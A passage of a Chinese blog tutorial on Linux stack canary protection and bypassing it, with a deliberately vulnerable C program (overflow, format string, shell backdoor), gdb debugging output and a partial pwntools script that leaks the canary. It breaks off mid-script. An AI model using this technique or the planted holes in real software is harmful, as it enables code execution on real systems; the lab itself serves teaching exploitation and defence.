        <content type="html"><![CDATA[<h2 id="1：介绍"><a href="#1：介绍" class="headerlink" title="1：介绍"></a>1：介绍</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。<br>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。<br>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p><h2 id="2：Canary-原理"><a href="#2：Canary-原理" class="headerlink" title="2：Canary 原理"></a>2：Canary 原理</h2><p>在 GCC 中使用 Canary<br>可以在 GCC 中使用以下参数设置 Canary:</p><pre class=" language-bash"><code class="language-bash">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护-fno-stack-protector 禁用保护</code></pre><p>开启 Canary 保护的 stack 结构大概如下：</p><pre><code>        High        Address |                 |                +-----------------+                | args            |                +-----------------+                | return address  |                +-----------------+        rbp =&gt;  | old ebp         |                +-----------------+      rbp-8 =&gt;  | canary value    |                +-----------------+                | local variables |        Low     |                 |        Address</code></pre><p>汇编指令一般如下：</p><pre class=" language-bash"><code class="language-bash">mov     eax, large gs:14h   <span class="token comment" spellcheck="true">#将一个cookie放在eax</span>mov     <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>, eax    <span class="token comment" spellcheck="true">#再由eax放入[ebp+var_C]（栈中靠后的位置）</span>··········mov     eax, <span class="token punctuation">[</span>ebp+var_C<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#将其赋值到eax</span>xor     eax, large gs:14h  <span class="token comment" spellcheck="true">#将其与原cookie比较            #影响zf标志寄存器</span>jz      short loc_8048692  <span class="token comment" spellcheck="true">#如果计算结果不为0就跳转（上面的异或操作）</span></code></pre><p>如果栈中的cookie被更改了就会jz跳到call  __stack_chk_fail_local。其也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下：</p><pre class=" language-c"><code class="language-c">eglibc<span class="token number">-2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>希望我以后能懂这个定义（doge）</code></pre><p>对于 Linux 来说，gs 寄存器实际指向的是当前栈的 TLS 结构，gs:14h 指向的正是 <strong>stack_guard</strong>。 </p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  dtv_t <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  uintptr_t sysinfo<span class="token punctuation">;</span>  uintptr_t stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> tcbhead_t<span class="token punctuation">;</span></code></pre><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 <strong>security_init</strong> 进行初始化。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span>  <span class="token comment" spellcheck="true">// glibc直接使用了_dl_random的值并没有给赋值</span>  <span class="token comment" spellcheck="true">// 如果不采用这种模式, glibc也可以自己产生随机数</span>  <span class="token comment" spellcheck="true">//将_dl_random的最后一个字节设置为0x0</span>  uintptr_t stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 设置Canary的值到TLS中</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><span class="token macro property">#<span class="token directive keyword">define</span> THREAD_SET_STACK_GUARD(value) \  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></code></pre><p><strong>抓重点：每次开启程序cookie的值随机的</strong></p><h2 id="3：Canary-绕过技术"><a href="#3：Canary-绕过技术" class="headerlink" title="3：Canary 绕过技术"></a>3：Canary 绕过技术</h2><p>注意：Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，<strong>在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求</strong>。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p><strong>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串（因为它会贴着buf）。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节(\x00,然后就不会被截断)，来打印出剩余的 Canary 部分（前提是得有打印函数）。 这种利用方式需要存在合适的输出函数，并且可能需要第一次溢出泄露 Canary，之后再次溢出控制执行流程。</strong></p><p>例子：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><pre class=" language-bash"><code class="language-bash">$ gcc -m32 -no-pie test.c -o <span class="token function">test</span></code></pre><p>先读程序：输出Hello Hacker!后进入vuln函数，其buf大小为100而可以读入0x200个字符显然存在溢出，还有格式化字符串漏洞。后门getshell。<br>因为插入了cookie，所以我们要想办法得到cookie，找到它在栈中的正确位置构造payload绕过canary</p><h3 id="寻找cookie"><a href="#寻找cookie" class="headerlink" title="寻找cookie"></a>寻找cookie</h3><p>因为cookie插入时汇编代码特征明显，我们多留意其汇编相关的寄存器值即可<br>因为程序默认开启-fstack-protector保护，所以只为局部变量中含有数组的函数插入保护，那我们直接进入vuln函数：</p><pre class=" language-bash"><code class="language-bash">Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> vuln:<span class="token operator">=</span><span class="token operator">></span> 0x0804862b <span class="token operator">&lt;</span>+0<span class="token operator">></span>:    push   ebp   0x0804862c <span class="token operator">&lt;</span>+1<span class="token operator">></span>:    mov    ebp,esp   0x0804862e <span class="token operator">&lt;</span>+3<span class="token operator">></span>:    push   ebx   0x0804862f <span class="token operator">&lt;</span>+4<span class="token operator">></span>:    sub    esp,0x74   0x08048632 <span class="token operator">&lt;</span>+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x08048637 <span class="token operator">&lt;</span>+12<span class="token operator">></span>:    add    ebx,0x19c9   0x0804863d <span class="token operator">&lt;</span>+18<span class="token operator">></span>:    mov    eax,gs:0x14     <span class="token comment" spellcheck="true">#插入cookie</span>   0x08048643 <span class="token operator">&lt;</span>+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x08048646 <span class="token operator">&lt;</span>+27<span class="token operator">></span>:    xor    eax,eax   0x08048648 <span class="token operator">&lt;</span>+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x0804864f <span class="token operator">&lt;</span>+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x08048651 <span class="token operator">&lt;</span>+38<span class="token operator">></span>:    sub    esp,0x4   0x08048654 <span class="token operator">&lt;</span>+41<span class="token operator">></span>:    push   0x200   0x08048659 <span class="token operator">&lt;</span>+46<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804865c <span class="token operator">&lt;</span>+49<span class="token operator">></span>:    push   eax   0x0804865d <span class="token operator">&lt;</span>+50<span class="token operator">></span>:    push   0x0   0x0804865f <span class="token operator">&lt;</span>+52<span class="token operator">></span>:    call   0x8048420 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x08048664 <span class="token operator">&lt;</span>+57<span class="token operator">></span>:    add    esp,0x10   0x08048667 <span class="token operator">&lt;</span>+60<span class="token operator">></span>:    sub    esp,0xc   0x0804866a <span class="token operator">&lt;</span>+63<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>ebp-0x70<span class="token punctuation">]</span>   0x0804866d <span class="token operator">&lt;</span>+66<span class="token operator">></span>:    push   eax   0x0804866e <span class="token operator">&lt;</span>+67<span class="token operator">></span>:    call   0x8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>   0x08048673 <span class="token operator">&lt;</span>+72<span class="token operator">></span>:    add    esp,0x10   0x08048676 <span class="token operator">&lt;</span>+75<span class="token operator">></span>:    add    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867a <span class="token operator">&lt;</span>+79<span class="token operator">></span>:    <span class="token function">cmp</span>    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x1   0x0804867e <span class="token operator">&lt;</span>+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x08048680 <span class="token operator">&lt;</span>+85<span class="token operator">></span>:    nop   0x08048681 <span class="token operator">&lt;</span>+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#校验cookie</span>   0x08048684 <span class="token operator">&lt;</span>+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x0804868b <span class="token operator">&lt;</span>+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x0804868d <span class="token operator">&lt;</span>+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x08048692 <span class="token operator">&lt;</span>+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x08048695 <span class="token operator">&lt;</span>+106<span class="token operator">></span>:    leave     0x08048696 <span class="token operator">&lt;</span>+107<span class="token operator">></span>:    ret    End of assembler dump.gdb-peda$ </code></pre><p>我们让程序执行到<strong><em>6：0x08048643 &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax</em></strong>就可以从eax看到cookie的值</p><pre class=" language-bash"><code class="language-bash">EAX: 0x25710300 EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 --<span class="token operator">></span> 0xffffd018 --<span class="token operator">></span> 0x0 ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048643 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax<span class="token punctuation">)</span>EFLAGS: 0x216 <span class="token punctuation">(</span>carry PARITY ADJUST zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x8048632 <span class="token operator">&lt;</span>vuln+7<span class="token operator">></span>:    call   0x80484e0 <span class="token operator">&lt;</span>__x86.get_pc_thunk.bx<span class="token operator">></span>   0x8048637 <span class="token operator">&lt;</span>vuln+12<span class="token operator">></span>:    add    ebx,0x19c9   0x804863d <span class="token operator">&lt;</span>vuln+18<span class="token operator">></span>:    mov    eax,gs:0x14<span class="token operator">=</span><span class="token operator">></span> 0x8048643 <span class="token operator">&lt;</span>vuln+24<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span>,eax   0x8048646 <span class="token operator">&lt;</span>vuln+27<span class="token operator">></span>:    xor    eax,eax   0x8048648 <span class="token operator">&lt;</span>vuln+29<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x74<span class="token punctuation">]</span>,0x0   0x804864f <span class="token operator">&lt;</span>vuln+36<span class="token operator">></span>:    jmp    0x804867a <span class="token operator">&lt;</span>vuln+79<span class="token operator">></span>   0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>:    sub    esp,0x4<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0xf7fb2dc7 --<span class="token operator">></span> 0xfb38900a 0008<span class="token operator">|</span> 0xffffcf98 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffffcf9c --<span class="token operator">></span> 0x1 0016<span class="token operator">|</span> 0xffffcfa0 --<span class="token operator">></span> 0x1 0020<span class="token operator">|</span> 0xffffcfa4 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0xffffcfa8 --<span class="token operator">></span> 0xf7e4fab9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_IO_file_overflow+9<span class="token operator">></span>:    add    edx,0x162547<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0xf7fb0860 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 3, 0x08048643 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>发现EAX: 0x25710300  cookie，继续到read函数我们使其读入很多字符（200个）让其执行到要进行比较的时候</p><pre class=" language-bash"><code class="language-bash">EAX: 0x41684141 <span class="token punctuation">(</span><span class="token string">'AAhA'</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f08 --<span class="token operator">></span> 0x1 ECX: 0xde EDX: 0xf7fb3890 --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd008 <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>ESP: 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 EIP: 0x8048684 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14<span class="token punctuation">)</span>EFLAGS: 0x202 <span class="token punctuation">(</span>carry parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804867e <span class="token operator">&lt;</span>vuln+83<span class="token operator">></span>:    jle    0x8048651 <span class="token operator">&lt;</span>vuln+38<span class="token operator">></span>   0x8048680 <span class="token operator">&lt;</span>vuln+85<span class="token operator">></span>:    nop   0x8048681 <span class="token operator">&lt;</span>vuln+86<span class="token operator">></span>:    mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp-0xc<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x8048684 <span class="token operator">&lt;</span>vuln+89<span class="token operator">></span>:    xor    eax,DWORD PTR gs:0x14   0x804868b <span class="token operator">&lt;</span>vuln+96<span class="token operator">></span>:    je     0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcf90 --<span class="token operator">></span> 0xf7fb2d80 --<span class="token operator">></span> 0xfbad2887 0004<span class="token operator">|</span> 0xffffcf94 --<span class="token operator">></span> 0x2 0008<span class="token operator">|</span> 0xffffcf98 <span class="token punctuation">(</span><span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcf9c <span class="token punctuation">(</span><span class="token string">"AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfa0 <span class="token punctuation">(</span><span class="token string">"ABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfa4 <span class="token punctuation">(</span><span class="token string">"<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfa8 <span class="token punctuation">(</span><span class="token string">"AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac <span class="token punctuation">(</span><span class="token string">"A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048684 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>[ebp-0xc] == eax ，判断是否等于原cookie：DWORD PTR gs:0x14，我们发现要进行比较时eax的值被覆盖为AAhA，那查一下offset就知道cookie在栈中的位置了</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ pattern offset AAhAAAhA found at offset: 100gdb-peda$ </code></pre><p><strong>100刚好是buf大小。</strong></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>我们把payload设为 ‘A’*100直接发过去看看会发生什么（开启context.log_level)：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test'</span><span class="token keyword">:</span> pid 6732<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xe bytes:    <span class="token string">'Hello Hacker!\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x65 bytes:    <span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a ca d5 b5  88 87 04 08               │AAAA│····│····│    0000006c   <span class="token comment" spellcheck="true">##注意小端序问题</span></code></pre><p>我们可以看到AAA后面是0a，<strong>注意这是\n的ASCII码值，因为我们按下了空格\n</strong>。但后面跟着ca d5 b5，由上面的位置计算可知这是cookie的值，<strong>因为前面的\x00被\n覆盖所以无法阶段字符串将后面的什么鬼东西都输出来了，包括cookie的残余值。那我们就可以得到cookie了，只要减一个0xa即可。</strong><br>尝试：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a f7 a3 0b  88 87 04 08               │AAAA│····│····│    0000006ccanary <span class="token operator">=</span><span class="token operator">></span>0xba3f700</code></pre><p>那接下来我们测出溢出点就可以了，我们可以插入gdb.attach(sh)在调试中测试：</p><p>测试</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> 